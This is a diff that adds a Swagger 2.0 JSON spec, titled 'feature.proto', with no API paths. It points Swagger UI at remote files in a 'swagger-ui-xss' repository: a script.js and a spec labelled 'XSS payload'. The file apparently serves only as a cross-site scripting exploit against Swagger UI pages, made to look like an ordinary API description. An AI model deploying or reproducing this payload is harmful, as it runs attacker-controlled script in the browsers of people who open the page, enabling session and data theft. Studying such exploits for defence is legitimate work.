@@ -1,0 +1,22 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "feature.proto",
+    "version": "version not set"
+  },
+  "paths": {},
+  "host": "raw.githubusercontent.com",
+  "schemes": [
+    "https"
+  ],
+  "externalDocs": {
+    "description": "Find more info here",
+    "url": "https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/refs/heads/main/script.js"
+  },
+  "urls": [
+    {
+      "url": "https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/xss-fetch.yaml",
+      "name": "XSS payload"
+    }
+  ]
+}
